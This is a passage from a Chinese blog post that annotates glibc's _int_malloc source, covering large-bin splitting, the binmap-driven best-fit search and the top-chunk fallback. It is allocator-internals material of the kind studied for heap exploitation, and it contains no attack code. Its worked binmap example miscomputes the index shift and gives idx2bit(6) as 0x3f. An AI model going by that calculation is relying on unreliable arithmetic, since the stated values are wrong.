class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">            <span class="comment">// 取下堆块</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">            <span class="comment">// 如果取下的堆块大小减去实际需要分配的堆块大小小于MINSIZE，那么就不要切割了，直接将这个堆块返回</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="comment">// 如果取下的堆块大小减去实际需要分配的堆块大小大于MINSIZE</span></span><br><span class="line">              <span class="comment">// 那么切割堆块，并将剩下的部分放入unsortedbins中</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">// 返回堆块</span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>到这儿，说明实际需要分配的堆块在<code>smallbins</code>、<code>largebins</code>、<code>unsortedbins</code>(整理碎片后的)中都没有正好符合大小的堆块可以被分配，那么，程序将尝试寻找一个大一些的堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 利用bitmap快速判断哪一些bin(small/largebins中的bin)中有堆块存在，防止浪费效率</span></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="comment">// 判断堆块属于哪一个block</span></span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="comment">// 取出32位长的对应block的map值</span></span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      <span class="comment">// 将idx转化为bit，准备与map值进行比较</span></span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 比较idx转化为的bit值是否大于map值，如果大于，说明此block中没有任何一个bin中拥有比实际需要分配的堆块更大的堆块</span></span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">// ++block，尝试查找下一个block</span></span><br><span class="line">                  <span class="comment">// 当不存在任何一个bin，其中的空闲堆块比实际需要分配的堆块要大，那么直接使用top_chunk(下面会讲)</span></span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">// 尝试获取下一个block对应的map值，判断其是否是0</span></span><br><span class="line">              <span class="comment">// 如果是0，说明下一个block中所包含的任何一个bin中都没有空闲堆块</span></span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 如果存在bit&lt;map的情况，那么说明存在空闲堆块比实际需要分配的堆块要大</span></span><br><span class="line">              <span class="comment">// 并且此堆块所在的bin一定在此block所包含的bin中</span></span><br><span class="line">              <span class="comment">// 那么，将bin定位至此block中的第一个bin的位置</span></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">// 从此block中的第一个bin开始查找，直到找到那个存在空闲堆块的bin</span></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;   <span class="comment">// bit作为计数器，每找一个左移一位，标记了此时检查到的bin(和binmap原理一样)</span></span><br><span class="line">              assert (bit != <span class="number">0</span>); <span class="comment">// bit作为int，4字节长，如果左移至溢出，说明出现了问题，并没有找到对应的bin(这是不合理的，因为上面的程序保证了一定会找到)</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// 找到对应的bin后，取出bin中的第一个堆块</span></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line">          <span class="comment">// 检查是否是误报，因为binmap的值不是实时更新的，可能对应位的值是假的1</span></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">             <span class="comment">// 分配这个bin中的堆块</span></span><br><span class="line">              size = chunksize (victim);</span><br><span class="line">              <span class="comment">// 取第一个就可以，因为第一个就已经足够大</span></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              <span class="comment">// 取下堆块</span></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line">              <span class="comment">// 下面的步骤和上面分配largebins一样了，不再细说</span></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>如果尝试寻找一个较大的堆块也失败了，那么就只能使用<code>top_chunk</code>了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">// 如果topchunk被切割后，剩下的大小大于等于MINSIZE，那么就切割topchunk</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">// 更新malloc_state中的topchunk的地址</span></span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// 如果发现topchunk被切割后，剩下的大小小于MINSIZE</span></span><br><span class="line">       <span class="comment">// 并且此时fastbins中存在堆块，那么调用malloc_consolidate</span></span><br><span class="line">       <span class="comment">// 合并fastbins中的堆块并将其放入unsortedbins中，再尝试一次大循环</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 这么做的原因是防止实际上申请的是一个small chunk</span></span><br><span class="line">      <span class="comment">// 但是由于topchunk、small/largebins中都没有恰好/更大的堆块了，从而导致无法分配</span></span><br><span class="line">      <span class="comment">// (这里调用malloc_consolidate是由于如果实际需要分配的是small chunk，那么在之前的步骤中是不会触发malloc_consolidate的)</span></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">// 到这儿，说明内存已经完全不够用了，那么就调用sysmalloc，向内核申请更多的内存</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="Binmap"><a href="#Binmap" class="headerlink" title="Binmap"></a>Binmap</h2><p>这里要插一个知识点，也就是在大循环查找较大的堆块的过程中，有提到一个结构:<code>binmap</code>，这里简单介绍一下这个结构</p><p>如果仔细看<code>malloc_state</code>的构成，相信大家已经找到了这个<code>binmap</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE]; </span><br></pre></td></tr></table></figure><p>那么这个<code>binmap</code>主要是用来做什么呢？</p><p>实际上binmap的主要作用，就是用来标示当前一个bin中是否存在空闲的堆块，这种结构可以帮助我们在malloc查找较大堆块的时候快速分辨 所有的bin中哪些存在堆块，而不用去遍历每一个bin，节省了时间</p><p>这里有一点要注意，binmap的位计数从0开始，一共有128位(0-127)，但是实际使用到的位只有125位</p><ul><li>unsortedbins中堆块的变化不会被记录到binmap中，也即binmap的第1位恒为0</li><li>第0位以及第127位不被使用，恒为0</li><li>所有的(small/largebins)中的bin中是否存在堆块(0 or 1)，被记录在binmap的第x位(x为bin的索引值)</li></ul><p>与binmap有关的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br></pre></td></tr></table></figure><p>可以看到<code>BINMAPSIZE</code>这个宏，这个宏计算后实际上是4，这代表了<code>binmap</code>将所有的bin分成了4块，相当于<code>binmap[4]</code>，每个数组元素为32位长,每一位都代表了对应索引的bin中是否存在空闲堆块(0=不存在，1=存在)</p><p>而之前我们用到的<code>idx2block</code>这个宏，就是用来根据bin的索引idx来得到其属于哪一个block的</p><p>宏<code>idx2bit</code>则是用来通过bin的索引得到bit值，用来与bin所属的block的map值来进行比较，如果bit值大于map值，那么就说明此block中不存在任何一个bin拥有比实际需要分配的堆块更大的空闲堆块</p><p>看个例子</p><p><img src="/image/malloc/bins.png" alt="bins"></p><p>可以看到，此时<code>smallbins</code>中大小为<code>0x60</code>的bin中存在空闲堆块</p><p>此时<code>binmap</code>的值</p><p><img src="/image/malloc/binmap.png" alt="binmap"></p><p>可以看到binmap位于<code>0x7ffff7dd04a0</code>-<code>0x7ffff7dd04b0</code></p><p>用上面的宏计算一下0x60的堆块应当处于哪一个block，顺便计算一下bit的值： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">idx = <span class="number">0x60</span>&lt;&lt;<span class="number">4</span> = <span class="number">6</span></span><br><span class="line">block = idx2block(<span class="number">6</span>) = <span class="number">6</span>&gt;&gt;<span class="number">5</span> = <span class="number">0</span></span><br><span class="line">bit = idx2bit(<span class="number">6</span>) = <span class="number">1</span>&lt;&lt;<span class="number">6</span> &amp; ((<span class="number">1</span>&lt;&lt;<span class="number">5</span>)<span class="number">-1</span>) = <span class="number">0x3f</span></span><br></pre></td></tr></table></figure><p>我们先根据block的值，得到对应的map值</p><p>因为block为0，那么就说明map的值是binmap[0]的值，此时为<code>0x00000040</code></p><p>可以注意到，0x40其实是<code>01000000</code>,第7位是1，这代表了”索引为6处(从0开始)的bin中存在空闲堆块”</p><p>这样再看之前寻找更大堆块的逻辑，就很好理解了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> ++idx;</span><br><span class="line"> bin = bin_at (av, idx);</span><br><span class="line"> block = idx2block (idx);</span><br><span class="line"> <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line"> bit = idx2bit (idx); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (;; )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">     <span class="comment">// 此时bit为0x3f,map为0x40，说明确实存在较大的块，所以跳过下面的步骤</span></span><br><span class="line">     <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">       <span class="comment">// 但是如果假设此时bit为0x3f,map为0x20，那么就会进到if中</span></span><br><span class="line">         <span class="keyword">do</span></span><br><span class="line">       <span class="comment">// 此时进行循环，尝试得到下一个block对应的map值</span></span><br><span class="line">       <span class="comment">// 只要下一个block对应的map值不为0，就退出循环</span></span><br><span class="line">       <span class="comment">// 因为下一个block中包含的bin中所拥有的堆块一定比前一个block中包含的bin中所拥有的堆块要大</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">// 当block大于最大值，说明了没有更大的堆块，那么直接use topchunk</span></span><br><span class="line">             <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">               <span class="keyword">goto</span> use_top;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line">       <span class="comment">// 找到存在较大堆块bin所属的block之后，直接将bin定位至此block开头的bin</span></span><br><span class="line">         bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">       <span class="comment">// 将bit置1，用来标记检查到第几个bin(1=0x00000001)</span></span><br><span class="line">       <span class="comment">// 这种标记方法和binmap的原理一样，第几位被置1就说明即将检查到相对于当前map的索引为几的bin</span></span><br><span class="line">         bit = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">// 由于实际情况在当前block 0 中确实存在较大的块</span></span><br><span class="line">     <span class="comment">// 所以就直接在当前idx的位置直接开始找存在较大堆块的bin，直到找到为止</span></span><br><span class="line">     <span class="comment">// 并不需要像上面假设的情况中将bin定位至此block开头的bin</span></span><br><span class="line">     <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">     <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">         bin = next_bin (bin);</span><br><span class="line">         bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">         assert (bit != <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>至于为何说binmap不是实时的，仔细看下注释和代码就能理解了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 